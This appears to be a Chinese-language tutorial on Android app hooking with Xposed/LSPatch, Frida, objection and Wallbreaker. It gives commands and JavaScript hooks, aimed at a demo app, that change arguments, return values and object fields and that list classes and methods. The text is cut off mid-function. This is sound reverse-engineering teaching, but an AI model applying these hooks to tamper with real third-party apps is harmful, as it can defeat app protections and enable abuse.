<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用Xposed自身提供的XposedHelpers的findClass方法加载每一个类</span><br><span class="line"></span><br><span class="line">XposedHelpers.findClass  // 作为参数传入/实例化</span><br><span class="line">XposedHelpers.findAndHookMethod</span><br><span class="line"></span><br><span class="line">final Class&lt;?&gt; ArrayList= XposedHelpers.findClass(&quot;java.util.ArrayList&quot;, loadPackageParam.classLoader);</span><br><span class="line">final Class&lt;?&gt; Map= XposedHelpers.findClass(&quot;java.util.Map&quot;, loadPackageParam.classLoader);</span><br></pre></td></tr></table></figure>

<h2 id="lspatch-shizuku-实现-Hook"><a href="#lspatch-shizuku-实现-Hook" class="headerlink" title="lspatch+shizuku 实现 Hook"></a>lspatch+shizuku 实现 Hook</h2><ul>
<li>LSPosed框架的免 Root 实现</li>
</ul>
<p><a href="https://duzhaokun123.github.io/2022/05/06/simple-lspatch-guide.html">https://duzhaokun123.github.io/2022/05/06/simple-lspatch-guide.html</a></p>
<p>1、电脑运行命令激活 <code>Shizuku</code></p>
<p>2、<code>LSPatch</code> 显示 <code>Shizuku</code>服务可用</p>
<p>3、本地和打包运行（本机运行和单机运行）</p>
<h3 id="XPosed调试流程"><a href="#XPosed调试流程" class="headerlink" title="XPosed调试流程"></a>XPosed调试流程</h3><p>1、AS 编写 XPosed 代码，手机 ROOT，安装 LSP，通过 LSP 去指定模块、指定程序</p>
<p>2、免 ROOT 流程，激活 Shizuku，LSPatch 中 Shizuku 服务可用，在 LSPatch 中指定程序，运行后 LSPosed 脚本后，可在指定运行的模块。</p>
<h2 id="Hook-代码交互"><a href="#Hook-代码交互" class="headerlink" title="Hook 代码交互"></a>Hook 代码交互</h2><p><a href="https://skyhand.blog.csdn.net/article/details/117674003">https://skyhand.blog.csdn.net/article/details/117674003</a></p>
<p><a href="https://jasper1024.com/jasper/20220317024954/">https://jasper1024.com/jasper/20220317024954/</a></p>
<h1 id="frida"><a href="#frida" class="headerlink" title="frida"></a>frida</h1><h2 id="基础-1"><a href="#基础-1" class="headerlink" title="基础"></a>基础</h2><ul>
<li>firda-&gt;client 用 python安装即可，安装 frida-tools 自动安装 frida</li>
<li>firda 的版本随着 python，server 和 client 版本要对上</li>
<li>client -&gt;写代码端、server -&gt;接受代码执行</li>
<li>打开编辑器 code .</li>
<li>14.2.18</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frida-ps的具体使用方法如下：  https://frida.re/docs/frida-trace/</span><br><span class="line"></span><br><span class="line">#连接到USB设备查看进程列表  frida-ps -U </span><br><span class="line">#连接到USB设备查看正在运行的应用  frida-ps -U -a </span><br><span class="line">#连接到USB设备查看所有安装的应用  frida-ps -U -a -i  </span><br><span class="line">#指定查看某个设备  frida-ps -D a666666 -a</span><br><span class="line"></span><br><span class="line">frida-trace -UF -j &#x27;*!*tesucanshu*&#x27;</span><br><span class="line"></span><br><span class="line">// 设备相关</span><br><span class="line">-D  连接到指定的设备，多个设备时使用。示例:frida-trace -D 555315d66cac2d5849408f53da9eea514a90547e -F </span><br><span class="line">-U  连接到USB设备，只有一个设备时使用。示例fria-trace -U -F</span><br><span class="line"></span><br><span class="line">// 应用程序相关</span><br><span class="line">-f  目标应用包名。spawn模式。示例:frida-trace -U -f com.apple.www</span><br><span class="line">-F  当前正在运行的程序。attach模式示例。示例:frida-trace -U -F或frida-trae -UF</span><br><span class="line">-n  正在运行的程序的名字。attach模式。示例:frida-trace -U -n QQ</span><br><span class="line">-N  正在运行的程序的包名。attach模式。示例:frida-trace -U -N com.apple.www</span><br><span class="line">-p  正在运行的程序的pid。attach模式。示例:frida-trace -U -p 2302</span><br><span class="line">  </span><br><span class="line">// 方法相关，以下参数在一条跟踪命令中可重复使用</span><br><span class="line">-I  包含模块。示例:frida-trace -UF -I &quot;libcommonCrypto*&quot;</span><br><span class="line">-X  不包含模块。示例:frida-trace -UF -X &quot;libcommonCrypto*&quot;</span><br><span class="line">-i   包含c函数。示例:frida-trace -UF -i &quot;strtsr&quot;</span><br><span class="line">-x   不包名c函数。示例:frida-trace -UF -i &quot;*MD5&quot; -x &quot;CC_MD5&quot;</span><br><span class="line">-a   包含模块+偏移跟踪。示例:frida-trace -UF -a 模块名\!0x7B7D48 </span><br><span class="line">-j  包含某个Java方法 实列frida-trace -UF  -j &#x27;*!*tesucanshu*/isu&#x27;</span><br><span class="line">	!用来分隔MODULE和OFFSET，例如&quot;gdi32full.dll!ExtTextOutW&quot;</span><br><span class="line">	*代表匹配任意内容</span><br><span class="line"></span><br><span class="line">-J  包含某个Java方法 实列frida-trace -UF  -J &#x27;*!*tesucanshu*/isu&#x27;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">// 日志相关</span><br><span class="line">-o  日志输出到文件。示例:frida-trace -UF -j &#x27;*!*tesucanshu*/isu&#x27; -o run.log</span><br></pre></td></tr></table></figure>



<h2 id="LSPosed-和-Frida-hook-流程"><a href="#LSPosed-和-Frida-hook-流程" class="headerlink" title="LSPosed 和 Frida hook 流程"></a>LSPosed 和 Frida hook 流程</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LSPosed:</span><br><span class="line">1、安装面具(管理root权限和安装模块)、安装LSPosed（执行XPosed代码、指定程序、刷新需重启程序）</span><br><span class="line">2、之前案例是编写 java 代码，常用 findAndHookMethod，重写 beforeHookedMethod 和 afterHookedMethod</span><br><span class="line"></span><br><span class="line">Frida：</span><br><span class="line">1、服务端在 app 上启动，自动注入 hook 的启动程序</span><br><span class="line">2、客户端在主机启动，执行命令连接，而后编写 js 脚本进行 hook，动态刷新</span><br><span class="line">3、可注入当前运行程序 / 自选包名（Attach/Spwan）</span><br></pre></td></tr></table></figure>



<h2 id="查看修改参数-x2F-返回值"><a href="#查看修改参数-x2F-返回值" class="headerlink" title="查看修改参数&#x2F;返回值"></a>查看修改参数&#x2F;返回值</h2><blockquote>
<p>文档有许多的例子:因为frida 出来很久了所以百度会有许多他的案例</p>
<p><a href="https://blog.csdn.net/freeking101/article/details/112634649">https://blog.csdn.net/freeking101/article/details/112634649</a></p>
<p><a href="https://kevinspider.github.io/frida/frida-hook-java/">https://kevinspider.github.io/frida/frida-hook-java/</a></p>
<p><a href="https://www.anquanke.com/post/id/195869">https://www.anquanke.com/post/id/195869</a></p>
<p><a href="https://frida.re/docs/examples/android/">https://frida.re/docs/examples/android/</a></p>
<p><a href="https://www.cnblogs.com/angelyan/p/16941444.html">https://www.cnblogs.com/angelyan/p/16941444.html</a>   常用frida hook - Maple_feng - 博客园</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frida -U -f com.example.hookdemo -l lesson2.js --no-pause</span><br><span class="line">frida -UF -l lesson3.js</span><br><span class="line">Tip:</span><br><span class="line">1、HOOK默认是把对象hook没了，要主动返回或是继续操作（this/return）</span><br><span class="line">2、默认已连接adb的设备会自动连接frida服务端，只有一台的情况下</span><br><span class="line">3、雷电模拟器要下载x86_64版本</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title class_">Java</span>.<span class="property">available</span>)&#123;</span><br><span class="line">            <span class="comment">//执行hook代码</span></span><br><span class="line">            <span class="comment">// var person_class = Java.use(&quot;com.example.hookdemo.Person&quot;);</span></span><br><span class="line">            <span class="comment">// console.log(person_class);</span></span><br><span class="line">            <span class="comment">// person_class.$init.overload(&#x27;java.lang.String&#x27;, &#x27;int&#x27;, &#x27;java.lang.String&#x27;).implementation = function(a1,a2,a3)&#123;</span></span><br><span class="line">            <span class="comment">//     console.log(&quot;a1=&gt;&quot;+a1+&quot; &quot;+&quot;a2=&gt;&quot;+a2+&quot; &quot;+&quot;a3=&gt;&quot;+a3);</span></span><br><span class="line">            <span class="comment">//     var result = this.$init(&quot;fridaxxx&quot;,a2,a3)</span></span><br><span class="line">            <span class="comment">//     return result;</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// &#125;</span></span><br><span class="line">            <span class="comment">// 查看并修改参数</span></span><br><span class="line">            <span class="keyword">let</span> <span class="title class_">Person</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.hookdemo.Person&quot;</span>);</span><br><span class="line">            <span class="title class_">Person</span>.<span class="property">setAddress</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">address2</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Person.setAddress is called: address2=<span class="subst">$&#123;address2&#125;</span>`</span>);</span><br><span class="line">                <span class="keyword">let</span> address = <span class="string">&quot;riben&quot;</span>;</span><br><span class="line">                <span class="variable language_">this</span>[<span class="string">&quot;setAddress&quot;</span>](address);</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="comment">// 查看并修改返回值</span></span><br><span class="line">            <span class="title class_">Person</span>[<span class="string">&quot;getName&quot;</span>].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Person.getName is called`</span>);</span><br><span class="line">                <span class="keyword">let</span> result = <span class="variable language_">this</span>[<span class="string">&quot;getName&quot;</span>]();</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Person.getName result=<span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;lisi&quot;</span>;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="comment">// 重载函数</span></span><br><span class="line">            <span class="title class_">Person</span>[<span class="string">&quot;print&quot;</span>].<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a1,a2,a3</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Person.print is called`</span>);</span><br><span class="line">                <span class="variable language_">this</span>[<span class="string">&quot;print&quot;</span>](a1,a2,a3);</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="title class_">Person</span>[<span class="string">&quot;print&quot;</span>].<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a1,a2</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Person.print is called`</span>,a1,a2);</span><br><span class="line">                <span class="variable language_">this</span>[<span class="string">&quot;print&quot;</span>](a1,a2);  </span><br><span class="line">            &#125;;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main); <span class="comment">//立即加载main函数</span></span><br><span class="line"><span class="comment">//setInterval(main,1000);//延时hook</span></span><br><span class="line"><span class="comment">//frida -U -f com.example.hookdemo -l lesson1.js </span></span><br></pre></td></tr></table></figure>



<h2 id="主动调用静态、普通函数、内部类、匿名类"><a href="#主动调用静态、普通函数、内部类、匿名类" class="headerlink" title="主动调用静态、普通函数、内部类、匿名类"></a>主动调用静态、普通函数、内部类、匿名类</h2><p>正式交付用 XPosed</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Java.perform(function()&#123;</span></span><br><span class="line"><span class="comment">//     let AnonymousClass1 = Java.use(&quot;com.example.hookdemo.Person$1&quot;);</span></span><br><span class="line"><span class="comment">//     AnonymousClass1[&quot;eatFunc&quot;].implementation = function (value) &#123;</span></span><br><span class="line"><span class="comment">//         console.log(`AnonymousClass1.eatFunc is called: value=$&#123;value&#125;`);</span></span><br><span class="line"><span class="comment">//         this[&quot;eatFunc&quot;](value);</span></span><br><span class="line"><span class="comment">//     &#125;;</span></span><br><span class="line"><span class="comment">//     let People = Java.use(&quot;com.example.hookdemo.Person$People&quot;);</span></span><br><span class="line"><span class="comment">//     People[&quot;$init&quot;].overload(&#x27;com.example.hookdemo.Person&#x27;, &#x27;java.lang.String&#x27;).implementation = function (ins,name) &#123;</span></span><br><span class="line"><span class="comment">//         console.log(`People.$init is called: name=$&#123;name&#125;`);</span></span><br><span class="line"><span class="comment">//         this[&quot;$init&quot;](ins,name);</span></span><br><span class="line"><span class="comment">//     &#125;;</span></span><br><span class="line"><span class="comment">// &#125;)</span></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">//主动调用静态方法，jadx复制的默认是被动触发</span></span><br><span class="line">    <span class="comment">//    var perclass =  Java.use(&quot;com.example.hookdemo.Person&quot;);</span></span><br><span class="line">    <span class="comment">//    perclass.print(&quot;xxx&quot;,20);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//调用普通方法</span></span><br><span class="line">    <span class="comment">// var perclass =  Java.use(&quot;com.example.hookdemo.Person&quot;);</span></span><br><span class="line">    <span class="comment">// var perins = perclass.$new(&quot;xxx&quot;,20,&quot;zhongguo&quot;);</span></span><br><span class="line">    <span class="comment">// console.log(perins.getName());</span></span><br><span class="line">    <span class="comment">// perins.print();</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// //调用匿名类的方法</span></span><br><span class="line">    <span class="keyword">let</span> <span class="title class_">AnonymousClass1</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.hookdemo.Person$1&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">AnonymousClass1</span>_ins = <span class="title class_">AnonymousClass1</span>.$new(perins); <span class="comment">// perins为默认传参</span></span><br><span class="line">    <span class="title class_">AnonymousClass1</span>_ins.<span class="title function_">eatFunc</span>(<span class="string">&quot;dayu&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// //调用内部类的方法</span></span><br><span class="line">    <span class="comment">// let People = Java.use(&quot;com.example.hookdemo.Person$People&quot;);</span></span><br><span class="line">    <span class="comment">// let People_ins = People.$new(perins,&quot;neibuxxx&quot;);</span></span><br><span class="line">    <span class="comment">// People_ins.print();</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// var perclass =  Java.use(&quot;com.example.hookdemo.Person&quot;);</span></span><br><span class="line">    <span class="comment">// console.log(perclass.name.value);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 动态选择，运行中所有实例化过的都给匹配出来了</span></span><br><span class="line">    <span class="comment">// Java.choose(&quot;com.example.hookdemo.Person&quot;,&#123;</span></span><br><span class="line">    <span class="comment">//     onMatch:function(instance)&#123;</span></span><br><span class="line">    <span class="comment">//         console.log(instance.name.value);</span></span><br><span class="line">    <span class="comment">//         // instance.name.value = &quot;11111&quot;;</span></span><br><span class="line">    <span class="comment">//     &#125;,onComplete:function()&#123;</span></span><br><span class="line">    <span class="comment">//         console.log(&quot;end&quot;);</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">// &#125;)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ins.print();</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>



<h2 id="特殊参数打印"><a href="#特殊参数打印" class="headerlink" title="特殊参数打印"></a>特殊参数打印</h2><p>记住几个，用到的时候去查</p>
<h2 id="访问静态属性"><a href="#访问静态属性" class="headerlink" title="访问静态属性"></a>访问静态属性</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> person_class = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.hookdemo.Person&quot;</span>);</span><br><span class="line">    <span class="comment">// console.log(person_class._print.value);  //属性名和方法名重复+_</span></span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.example.hookdemo.Person&quot;</span>,&#123;</span><br><span class="line">        <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(instance)</span><br><span class="line">            instance.<span class="property">name</span>.<span class="property">value</span> = <span class="string">&quot;xiugainame&quot;</span>;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(instance.<span class="property">name</span>.<span class="property">value</span>);</span><br><span class="line">        &#125;,<span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;end&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)	</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>



<h2 id="遍历指定类的所有方法"><a href="#遍历指定类的所有方法" class="headerlink" title="遍历指定类的所有方法"></a>遍历指定类的所有方法</h2><p><a href="https://www.jianshu.com/p/c9e6776516e8">https://www.jianshu.com/p/c9e6776516e8</a></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 此种方法会遍历重载、内部、get/set函数</span></span><br><span class="line"><span class="comment">// 理论是遍历已加载的类、但实际没实例化的都列出来了</span></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">enumerateLoadedClasses</span>(&#123;</span><br><span class="line">        <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">name,handle</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(name.<span class="title function_">indexOf</span>(<span class="string">&quot;com.example.hookdemo.Person&quot;</span>)!=-<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="comment">// console.log(name,handle);</span></span><br><span class="line">                <span class="comment">// 得到class</span></span><br><span class="line">                <span class="keyword">var</span> <span class="title class_">TargetClass</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(name);</span><br><span class="line">                <span class="comment">// 得到方法数组</span></span><br><span class="line">                <span class="keyword">var</span> methods = <span class="title class_">TargetClass</span>.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>();</span><br><span class="line">                <span class="comment">//遍历数组   进行hook</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;methods.<span class="property">length</span>;i++)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(methods[i].<span class="title function_">getName</span>())</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;serach end&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> classList = <span class="title class_">Java</span>.<span class="title function_">enumerateLoadedClassesSync</span>();</span><br><span class="line">    <span class="keyword">var</span> parsedMethods = [];</span><br><span class="line">    <span class="comment">// console.log(classList)</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; classList.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> targetClass = classList[i];</span><br><span class="line">        <span class="keyword">if</span> (targetClass == <span class="string">&quot;com.example.hookdemo.Person&quot;</span>) &#123;</span><br><span class="line">            <span class="comment">// 得到class</span></span><br><span class="line">            <span class="keyword">var</span> <span class="title class_">TargetClass</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(targetClass);</span><br><span class="line">            <span class="comment">// 得到方法数组</span></span><br><span class="line">            <span class="keyword">var</span> methods = <span class="title class_">TargetClass</span>.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>();</span><br><span class="line">            <span class="comment">//遍历数组   进行hook</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; methods.<span class="property">length</span>; j++) &#123;</span><br><span class="line">                <span class="comment">// console.log(methods[j].getName())</span></span><br><span class="line">                <span class="keyword">var</span> methodName = methods[j].<span class="title function_">getName</span>();</span><br><span class="line">                parsedMethods.<span class="title function_">push</span>(methodName);</span><br><span class="line">                <span class="comment">// console.log(TargetClass, methodName, TargetClass[methodName].overloads.length);</span></span><br><span class="line">            &#125;</span><br><span class="line">            parsedMethods.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">targetMethod</span>) &#123;</span><br><span class="line">                <span class="comment">// traceMethod(TargetClass + &quot;.&quot; + targetMethod);</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">TargetClass</span>, targetMethod);</span><br><span class="line">                <span class="comment">// 获取目标重载的方法数量</span></span><br><span class="line">                <span class="keyword">var</span> overloadCount = <span class="title class_">TargetClass</span>[targetMethod].<span class="property">overloads</span>.<span class="property">length</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> x = <span class="number">0</span>; x &lt; overloadCount; x++) &#123;</span><br><span class="line">                    <span class="title class_">TargetClass</span>[targetMethod].<span class="property">overloads</span>[x].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>, targetMethod);</span><br><span class="line">                        <span class="keyword">for</span> (<span class="keyword">var</span> a = <span class="number">0</span>; a &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; a++) &#123;</span><br><span class="line">                            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;arguments&#x27;</span>, a, <span class="variable language_">arguments</span>[a]);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">return</span> <span class="variable language_">this</span>[targetMethod].<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>



<h2 id="frida-集成工具-——-objection"><a href="#frida-集成工具-——-objection" class="headerlink" title="frida 集成工具 —— objection"></a>frida 集成工具 —— objection</h2><p><a href="https://www.anquanke.com/post/id/197657">https://www.anquanke.com/post/id/197657</a></p>
<p>1、集成各种常用 API，列出某个包的类&#x2F;方法等<br>2、启动前 frida 必须正常连接</p>
<p>运行步骤：</p>
<h3 id="1、查找包名-x2F-应用ID-x2F-PID"><a href="#1、查找包名-x2F-应用ID-x2F-PID" class="headerlink" title="1、查找包名 &#x2F; 应用ID &#x2F; PID"></a>1、查找包名 &#x2F; 应用ID &#x2F; PID</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 根据应用名查找包名</span><br><span class="line">frida-ps -U -a</span><br><span class="line">// 根据进程名查找包名</span><br><span class="line">frida-ps -U </span><br></pre></td></tr></table></figure>

<h3 id="2、指定包名-x2F-应用ID-x2F-PID"><a href="#2、指定包名-x2F-应用ID-x2F-PID" class="headerlink" title="2、指定包名 &#x2F; 应用ID &#x2F; PID"></a>2、指定包名 &#x2F; 应用ID &#x2F; PID</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">objection  --help 可以查看命令</span><br><span class="line">objection -g xxx/PID explore  </span><br><span class="line">	1.如果使用PID/应用名称   那就是attach模式</span><br><span class="line">	2.如果使用包名,那就是spwan模式,并且会帮助我们自动启动app</span><br><span class="line">	</span><br><span class="line">	-s &quot;命令&quot;</span><br><span class="line">	-c &quot;路径&quot;</span><br></pre></td></tr></table></figure>

<h3 id="3、常用命令"><a href="#3、常用命令" class="headerlink" title="3、常用命令"></a>3、常用命令</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.列出所有已加载的类:</span><br><span class="line">	android hooking list classes</span><br><span class="line"></span><br><span class="line">2.搜索关键字类</span><br><span class="line">	android hooking search classes MainActivity</span><br><span class="line">	</span><br><span class="line">3.列出类的所有方法</span><br><span class="line">	android hooking list class_methods com.example.hookdemo.MainActivity</span><br><span class="line">	</span><br><span class="line">4.hook方法  可以带上参数  返回值  调用栈，监控</span><br><span class="line">	android hooking watch class_method com.example.hookdemo.MainActivity.tesucanshu2 --dump-args --dump-return</span><br><span class="line">	</span><br><span class="line">5.hook类的所有方法</span><br><span class="line">	android hooking watch class com.example.hookdemo.MainActivity</span><br><span class="line"></span><br><span class="line">6.查看与取消hook</span><br><span class="line">	jobs list</span><br><span class="line">	jobs kill 049953</span><br><span class="line"></span><br><span class="line">7.搜索实列:</span><br><span class="line">	android heap search instances com.example.hookdemo.Person</span><br><span class="line"></span><br><span class="line">8.通过实例执行方法:</span><br><span class="line">	android heap execute 48164808 print</span><br><span class="line"></span><br><span class="line">9.进入编辑器环境</span><br><span class="line">	android heap evaluate 48164808</span><br><span class="line">	写代码:clazz.print()</span><br><span class="line">	esc 键退出环境,enter回车执行</span><br><span class="line">	</span><br><span class="line">	这个功能可以即时编写、出结果、即时调试自己的代码，不用再编写→注入→操作→看结果→再调整，而是直接出结果。</span><br><span class="line">	</span><br><span class="line">10.启动activity或service</span><br><span class="line">	查看可用的:android hooking list activities</span><br><span class="line">	启动:android intent launch_activity</span><br><span class="line">	</span><br><span class="line">	也可以先使用android hooking list services查看可供开启的服务，然后使用android intent launch_service 		com.android.settings.bluetooth.BluetoothPairingService命令来开启服务。</span><br><span class="line"></span><br><span class="line">11、枚举内存中的所有模块</span><br><span class="line">	memory list modules</span><br><span class="line"></span><br><span class="line">12、枚举模块中所有导出函数</span><br><span class="line">	memory list exports muyangdemo  --json 路径(结果太多时用)</span><br><span class="line">	</span><br></pre></td></tr></table></figure>



<h2 id="Wallbreak"><a href="#Wallbreak" class="headerlink" title="Wallbreak"></a>Wallbreak</h2><p>1、可集成在 objection 使用</p>
<p>2、用于快速分析 Java 类&#x2F;对象结构</p>
<p><a href="https://bbs.kanxue.com/thread-260110.htm">https://bbs.kanxue.com/thread-260110.htm</a></p>
<p><a href="https://github.com/hluwa/Wallbreaker">https://github.com/hluwa/Wallbreaker</a></p>
<p>attach模式 ：Frida会附加app</p>
<p>Spawn模式：重新启动app</p>
<p>1、加载插件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plugin load &#x27;路径&#x27;</span><br></pre></td></tr></table></figure>

<p>2、执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plugin wallbreaker classdump &#x27;类名&#x27;</span><br><span class="line">plugin wallbreaker classsearch &#x27;类名&#x27;</span><br><span class="line">plugin wallbreaker objectdump &#x27;对象名&#x27;</span><br><span class="line">plugin wallbreaker objectsearch &#x27;对象名&#x27;</span><br></pre></td></tr></table></figure>



<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">printStacks</span>(<span class="params">name</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;====== printStacks start ====== &quot;</span> + name + <span class="string">&quot;==============================&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// sample 1</span></span><br><span class="line">    <span class="keyword">var</span> throwable = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Throwable&quot;</span>).$new());</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(throwable);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// // sample 2</span></span><br><span class="line">    <span class="comment">// var exception = Java.use(&quot;android.util.Log&quot;).getStackTraceString(Java.use(&quot;java.lang.Exception&quot;).$new());</span></span><br><span class="line">    <span class="comment">// console.log(exception);</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;====== printStacks end ======== &quot;</span> + name + <span class="string">&quot;==============================&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> jclazz = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">var</span> jobj = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getObjClassName</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!jclazz) &#123;</span><br><span class="line">        <span class="keyword">var</span> jclazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!jobj) &#123;</span><br><span class="line">        <span class="keyword">var</span> jobj = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Object&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> jclazz.<span class="property">getName</span>.<span class="title function_">call</span>(jobj.<span class="property">getClass</span>.<span class="title function_">call</span>(obj));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">watch</span>(<span class="params">obj, mtdName</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> listener_name = <span class="title 